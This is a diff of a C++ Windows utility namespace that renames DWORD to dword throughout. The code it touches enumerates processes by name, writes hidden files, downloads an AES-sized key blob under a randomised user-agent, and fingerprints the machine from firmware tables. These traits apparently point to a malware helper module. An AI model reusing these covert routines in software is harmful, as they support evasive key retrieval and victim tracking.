@@ -56,9 +56,9 @@ namespace utl {
 			do {
 				if (!lstrcmpiW(pe32.szExeFile, pProcessName)) {
 					if (pProcesses)
-						pProcesses = (DWORD*)realloc(pProcesses, sizeof(DWORD) * *nProcesses);
+						pProcesses = (dword*)realloc(pProcesses, sizeof(dword) * *nProcesses);
 					else
-						pProcesses = (DWORD*)malloc(sizeof(DWORD));
+						pProcesses = (dword*)malloc(sizeof(dword));
 
 					pProcesses[*nProcesses] = pe32.th32ProcessID;
 					(*nProcesses)++;
@@ -108,7 +108,7 @@ namespace utl {
 	) {
 		HANDLE hFile = CreateFileW(pFileName, GENERIC_RW, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
 		if (hFile) {
-			DWORD dwT;
+			dword dwT;
 			BOOL bT = WriteFile(hFile, pBuffer, nBuffer, &dwT, NULL);
 			CloseHandle(hFile);
 			return bT;
@@ -143,7 +143,7 @@ namespace utl {
 
 	// Only Test rn but might be implemented further
 	DEPRECATED void* IDownloadKey() {
-		PCWSTR szAgent = EAllocRandomBase64StringW(NULL, 8, 16);
+		PCWSTR szAgent = rng::EAllocRandomBase64StringW(NULL, 8, 16);
 		HINTERNET hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
 		if (!hNet)
 			return NULL;
@@ -163,7 +163,7 @@ namespace utl {
 
 		// InternetCloseHandle(hUrl);
 		InternetCloseHandle(hNet);
-		if ((nRead != AES_BLOB_SIZE) || ((DWORD)pBuffer != 0x4d42444b)) {
+		if ((nRead != AES_BLOB_SIZE) || ((dword)pBuffer != 0x4d42444b)) {
 			free(pBuffer);
 			return NULL;
 		}
@@ -180,7 +180,7 @@ namespace utl {
 		BOOL s = InternetCheckConnectionW(szUrl, NULL, NULL);
 		if (!s)
 			return -1; // Couldn't connect to Url/Server
-		PCWSTR szAgent = EAllocRandomBase64StringW(NULL, 8, 16);
+		PCWSTR szAgent = rng::EAllocRandomBase64StringW(NULL, 8, 16);
 		HINTERNET hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
 		free((void*)szAgent);
 		if (!hNet)
@@ -211,14 +211,14 @@ namespace utl {
 		BCRYPT_HASH_HANDLE hh;
 		BCryptCreateHash(ah, &hh, nullptr, 0, nullptr, 0, NULL);
 
-		const DWORD dwFTPS[] = { 'ACPI', 'FIRM', 'RSMB' };
-		for (char i = 0; i < sizeof(dwFTPS) / sizeof(DWORD); i++) {
+		const dword dwFTPS[] = { 'ACPI', 'FIRM', 'RSMB' };
+		for (char i = 0; i < sizeof(dwFTPS) / sizeof(dword); i++) {
 			// Enumerate Table Entries
 			size_t nTableId = EnumSystemFirmwareTables(dwFTPS[i], nullptr, 0);
 			dword* pTableId = (dword*)malloc(nTableId);
 			EnumSystemFirmwareTables(dwFTPS[i], pTableId, nTableId);
 
-			for (uchar j = 0; j < nTableId / sizeof(DWORD); j++) {
+			for (uchar j = 0; j < nTableId / sizeof(dword); j++) {
 				// Instance Table
 				size_t nTable = GetSystemFirmwareTable(dwFTPS[i], pTableId[j], nullptr, 0);
 				void* pTable = malloc(nTable);
@@ -249,10 +249,10 @@ namespace utl {
 			byte  SMBIOSMajorVersion;
 			byte  SMBIOSMinorVersion;
 			byte  DmiRevision;
-			DWORD Length;
+			dword Length;
 			byte  SMBIOSTableData[];
 		} SMBIOS, * PSMBIOS;
-		DWORD dwTable;
+		dword dwTable;
 		EnumSystemFirmwareTables('RSMB', &dwTable, sizeof(dwTable));
 		size_t nTable = GetSystemFirmwareTable('RSMB', dwTable, NULL, 0);
 		PSMBIOS smTable = (SMBIOS*)malloc(nTable);
